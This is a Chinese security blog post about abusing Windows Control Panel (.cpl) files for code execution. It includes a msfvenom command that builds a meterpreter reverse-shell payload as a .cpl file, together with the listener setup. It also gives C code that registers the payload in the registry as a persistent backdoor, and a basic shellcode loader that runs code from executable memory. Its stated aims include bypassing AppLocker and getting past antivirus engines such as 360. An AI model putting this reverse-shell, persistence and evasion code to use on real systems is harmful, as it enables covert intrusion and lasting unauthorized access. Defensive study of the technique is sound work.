> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ue5_tQDXsmg2OtMe776O1g)

前言
--

最近无意间发现了 cpl 文件, 之前对该类型的文件了解几乎为零, 由于触及到我的知识盲区, 于是决定探究。

cpl 文件
------

CPL 文件，是 Windows 控制面板扩展项，CPL 全拼为`Control Panel Item` 在 system32 目录下有一系列的 cpl 文件, 分别对应着各种控制面板的子选项

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic4zic4TxUTHGIbePMvgUuU7Rbe7lLpcrFaDXfaJ7No1ogooVGDs9F5FChibQ63ibIK6GqmMQJicB0XYw/640?wx_fmt=png)

列入我们`win+R`输入`main.cpl`

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic4zic4TxUTHGIbePMvgUuU7F3yGrMY56PR2avjBM16wCeia09OFnTLCBtTrianwZmtP21qX8ogB0Dkg/640?wx_fmt=png)

将会打开控制面板中的鼠标属性

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic4zic4TxUTHGIbePMvgUuU7djQKg3N5Vxib7klKfQm3ribAicicLwhv3yM0bMcYx10S3oGLBbficLBkOLA/640?wx_fmt=png)

cpl 文件本质是属于 PE 文件

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic4zic4TxUTHGIbePMvgUuU7IMId6pp2jqEKGtoBpuxJ87ThI7Imiccoaibnwtibww9xVViauEFmrdTA6A/640?wx_fmt=png)

但 cpl 并不像 exe, 更像是 dll, 无法直接打开, 只能以加载的形式运行。并且有一个导出函数`CPlApplet` 该函数是控制面板应用程序的入口点，它被控制面板管理程序自动调用，且是个回调函数。

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic4zic4TxUTHGIbePMvgUuU7UvibDnVMoUoBviaibulsia7RIbA1dMLTXJgayOsoQskKWxscT4NibhDDmbw/640?wx_fmt=png)

如何打开 cpl
--------

1. 双击或者 win+r xxx.cpl 2.control <文件名> 3.rundll32 shell32.dll,Control_RunDLL < 文件名 > 注意：所有 rundll32 shell32.dll,Control_RunDLL 的命令均可用 control 替代，control.exe 实质调用了 rundll32.exe。打开后找不到 control.exe 进程，只能找到 rundll32.exe。

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic4zic4TxUTHGIbePMvgUuU7gicMYrodaIfByoDLSicl2HZwgZQu0LIYFjJGPVSnx7icic9xVnZUQLborA/640?wx_fmt=png)

4.vbs 脚本

```
Dim objSet obj = CreateObject("Shell.Application")obj.ControlPanelItem("C:\Users\11793\Desktop\cpl.cpl")
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic4zic4TxUTHGIbePMvgUuU7bqG79UhukBicjIra26eYPdV0ZTESmqVeXVz34xH0mxqt1QqMicqqPHpw/640?wx_fmt=png)

5.js 脚本

```
var a = newActiveXObject("Shell.Application");a.ControlPanelItem("C:\\Users\\11793\\Desktop\\cpl.cpl");
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic4zic4TxUTHGIbePMvgUuU7EQG44b8XpuRFW5Cfo9Y5mjbITyplPzVo8jAGQGMZenTxURahKPO9ug/640?wx_fmt=png)

如何自己制造一个 cpl 文件
---------------

最简单的方式: 直接创建一个 dll, 无需导出函数, 然后改后缀名

```
BOOL APIENTRY DllMain( HMODULE hModule,                       DWORD  ul_reason_for_call,                       LPVOID lpReserved){switch(ul_reason_for_call){case DLL_PROCESS_ATTACH:WinExec("Calc.exe", SW_SHOW);case DLL_THREAD_ATTACH:case DLL_THREAD_DETACH:case DLL_PROCESS_DETACH:break;}return TRUE;}
```

随便一种方式执行

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic4zic4TxUTHGIbePMvgUuU7e8nQp7Mh0Ot8pN1Gm5lXeiadRklzZutTOsFexHqsZwl3KdhIOGic83Vw/640?wx_fmt=png)

这里既然可以弹出 calc.exe, 那么能不能执行自己的 payload 的呢, 答案是肯定的。

cpl 文件的应用
---------

### bypass Windows AppLocker

什么是`Windows AppLocker`: AppLocker 即 “应用程序控制策略”，是 Windows 7 系统中新增加的一项安全功能。在 win7 以上的系统中默认都集成了该功能。

默认的 Applocker 规则集合, 可以看到 cpl 并不在默认规则中:

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic4zic4TxUTHGIbePMvgUuU7shxUV4qEWltbKoJckicqv60uJib7U4eoq0KvtlmDMb1Vn5fezYCOHwLA/640?wx_fmt=png)

开启 Applocker 规则: 打开计算机管理, 选择服务, 将`Application Identity`服务开启

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic4zic4TxUTHGIbePMvgUuU75ziaeKslOLsbWHiaQ86ibTIFJicXicBGL7GJQVsBvCTYiazat7ZvduFfREvA/640?wx_fmt=png)

然后在安全策略中, 添加一条 applocker 规则, 会询问是否添加默认规则

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic4zic4TxUTHGIbePMvgUuU7kricjDHXn6OgCHjZFh2ds1bUdwAdp4TIOGasoricVCvh7ydBKZLf1YJA/640?wx_fmt=png)

默认规则为:

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic4zic4TxUTHGIbePMvgUuU7PiaVoNfFfUjDsibWu2dJF84tsltAGMESsQKYMibQE5FT8SbKwPFkFSQ5Q/640?wx_fmt=png)

假设设置某一路径无法执行可执行程序, 再次运行时就会提示组策略安全, 不允许运行

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic4zic4TxUTHGIbePMvgUuU75YWoPzPum4koEGStoQibbrzLOSwYAUXuI9z0WLbO3g82D80UCekic6OQ/640?wx_fmt=png)

绕过的方式有很多, 这里只讲 cpl 文件 完全可以把代码写入到 cpl 文件中, 同样达到执行目的, 这里就弹一个 cmd

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic4zic4TxUTHGIbePMvgUuU7QzERz31owkly7fOia3n3uqY4ggnZT1byNYALH54vxibFwxQJOyP37e4A/640?wx_fmt=png)

### msf 直接生成 cpl 文件

生成 cpl 文件 `msfvenom -p windows/meterpreter/reverse_tcp -b '\x00\xff' lhost=192.168.111.128 lport=8877 -f dll -o cpl.cpl`

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic4zic4TxUTHGIbePMvgUuU7Ps5mScnVZpGIvb5hxpEaGc0IGA2wops3AZp6gicEjWibichWIIVE8RpUg/640?wx_fmt=png)

将文件拖到本地并运行, msf 监听

•use exploit/multi/handler•set payload windows/meterpreter/reverse_tcp•set lhost 192.168.111.128•set lport 8877•exploit

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic4zic4TxUTHGIbePMvgUuU7ZLBBJny429ibO6TzmkRibnQ4bLPdmQqrWCBZbibJSbnSGXIbibgU7sqjsQ/640?wx_fmt=png)

这样肯定是不够的, 可以把这个 cpl 文件当作一个后门, 做到一个权限维持的效果, 且比较隐蔽。将 cpl 文件名称改为`test.cpl` 创建一个项目, 作用为修改注册表:

```
HKEY hKey;DWORD dwDisposition;char path[] = "C:\\test.cpl";RegCreateKeyExA(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls", 0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition);RegSetValueExA(hKey, "test.cpl", 0, REG_SZ, (BYTE*)path, (1+ ::lstrlenA(path)));
```

不一定将 cpl 文件放到 c 盘更目录, 可以自定义路径 执行后

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic4zic4TxUTHGIbePMvgUuU7vzu1UCFEfdC0juaicqfwB4N1RXpAYl5GR1vAvFMgOjo2XglGtmRs17g/640?wx_fmt=png)

然后这里在开启 control.exe 时, test.cpl 文件也会被打开。

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic4zic4TxUTHGIbePMvgUuU7NaVlXc3Nr8FbIvL2eic9pCpaa12XwwrzkYhcrnBZsRP6aztokxNlLWA/640?wx_fmt=png)

如果目标主机有杀软, 可以通过该方法白加黑绕过, 但是 msf 的 cpl 文件特征非常明显, 静态太概率都会被杀掉。

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic4zic4TxUTHGIbePMvgUuU7xRxticTxGwia91Pchg7fjCSjz3BHt8xqnyaSZ9ibF8VGlWZl95o7FViauA/640?wx_fmt=png)

除了加壳之外, 寄希望于自己实现加载 shellcode, 方便做混淆。

### 使用 shellcode 自己做一个 cpl 文件

直接上代码

```
#include"pch.h"#include"windows.h"extern"C" __declspec(dllexport) VOID CPlApplet(HWND hwndCPl, UINT msg, LPARAM lParam1, LPARAM lParam2){MessageBoxA(0, NULL, "test", MB_OK);/* length: 835 bytes */unsignedchar buf[] = "shellcode";    LPVOID Memory= VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);    memcpy(Memory, buf, sizeof(buf));((void(*)())Memory)();}BOOL APIENTRY DllMain( HMODULE hModule,                       DWORD  ul_reason_for_call,                       LPVOID lpReserved){switch(ul_reason_for_call){case DLL_PROCESS_ATTACH:case DLL_THREAD_ATTACH:case DLL_THREAD_DETACH:case DLL_PROCESS_DETACH:break;}return TRUE;}
```

这是最最最最基础的 loader 先打开`control.exe`看看效果

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic4zic4TxUTHGIbePMvgUuU7MWpOLbbQUPXNlfuHEwABMC7yQDZ9LzFrpg0h0k5vH3vRyG0ePwQiasg/640?wx_fmt=png)

看看查杀率

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic4zic4TxUTHGIbePMvgUuU7ZknA3mNZj6VaUAibZ0ibraMnicrictyQ5JI1DhIVTYQnuLWeicLTxJIvMOQ/640?wx_fmt=png)

这里上传的文本, shellcode 没有做任何的处理, 查杀率已经算比较低的, 如果混淆一下, 很轻松的就可以静态过杀软, 再用白加黑, 是不是想想就很轻松呢。

经过一系列处理后, 找杀毒能力还比较强的 360 试一下

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic4zic4TxUTHGIbePMvgUuU7HSZRjI5rkubC7H9viaKGCaEWnicEZHoia2xrkiaAo1MtFeuGqPyh18w1Ag/640?wx_fmt=png)

**![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)**

**推荐阅读：**

https://wooyun.js.org/drops/CPL%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8%E4%BB%8B%E7%BB%8D.html

https://attack.mitre.org/techniques/T1218/002/

https://docs.microsoft.com/zh-cn/windows/security/threat-protection/windows-defender-application-control/applocker/working-with-applocker-rules

[Office 如何快速进行宏免杀](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247492416&idx=1&sn=c444b28f7aa67e9ee15d42bc1aeef10d&chksm=ec1cb67fdb6b3f69d33753fd68cad86f401c07f5fddb3157c81468cab144978a5fb3840da037&scene=21#wechat_redirect)  

[免杀方法大集结](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247488534&idx=1&sn=fd37b093e15cbcf82f0b5d408458658d&chksm=ec1f4129db68c83fda99a59dbe4ddc4c827a9ce25b4937b84056c5f164ee75ba96aeaf8f87a2&scene=21#wechat_redirect)  

[干货 | 如何快速完成 DLL 劫持，实现权限维持，重启上线](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247493305&idx=1&sn=5b292ca23204c7c6adabaff3bc6d7edf&chksm=ec1cb386db6b3a90e08b077116175120e078e74697832f9455eb2dc7020334955b8642af8288&scene=21#wechat_redirect)  

[实战中 exe 文件免杀](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247489970&idx=1&sn=f354af09c3f57ff4317b09fabc3ceec1&chksm=ec1f4c8ddb68c59ba96a4cf2300c7af1fdae5e4279016608583deeefda0322ced9bad9d52898&scene=21#wechat_redirect)  

本月报名可以参加抽奖送 BADUSB 的优惠活动  

  
[![](https://mmbiz.qpic.cn/mmbiz_jpg/Uq8Qfeuvouibfico2qhUHkxIvX2u13s7zzLMaFdWAhC1MTl3xzjjPth3bLibSZtzN9KGsEWibPgYw55Lkm5VuKthibQ/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247498688&idx=1&sn=d81921a3873e254b0a135d9ffaa00468&chksm=ec1caeffdb6b27e9d129e1b00e92e01d49ccca43bb18f2388c733143557bfaaf62d0efd7f22f&scene=21#wechat_redirect)

**点赞，转发，在看**

原创投稿作者：Buffer

![](https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif)